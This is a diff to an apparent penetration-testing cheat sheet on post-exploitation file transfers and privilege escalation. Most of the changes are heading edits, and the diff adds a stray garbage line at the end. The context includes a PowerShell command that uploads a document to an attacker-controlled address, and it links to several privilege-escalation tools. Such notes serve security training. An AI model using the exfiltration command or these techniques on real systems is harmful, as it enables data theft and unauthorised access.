@@ -1,7 +1,6 @@
-# Post Exploitation
-
-## **File Transfers**
-### Linux
+# PowerShell Empire
+# **File Transfers**
+## Linux
 - TFTP
   ```bash
     kali@kali:~# mkdir /tftp
@@ -14,7 +13,7 @@
   ```bash
     python -m SimpleHTTPServer [PORT] 
   ```
-### Windows
+## Windows
 - TFTP
   - Kali installation
   ```bash
@@ -117,11 +116,11 @@
   powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
   ```
     
-## **Privilege Escalation**
-### General commands
+# **Privilege Escalation**
+## General commands
   - **whoami**
   - **hostname**
-### **Linux**
+## **Linux**
 
 - **Manually**
   - More user information
@@ -243,7 +242,7 @@
   - [Privilage Escalation through sudo](https://github.com/TH3xACE/SUDO_KILLER)
   - [GTFOBins](https://gtfobins.github.io/)
 
-### **Windows**
+## **Windows**
 
 - **Manually**
   - More user information
@@ -358,3 +357,4 @@
   - [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)
   - [Windows Exploit Suggester](https://github.com/bitsadmin/wesng)
   - [Privesc Check](https://github.com/itm4n/PrivescCheck)
+đđđđ
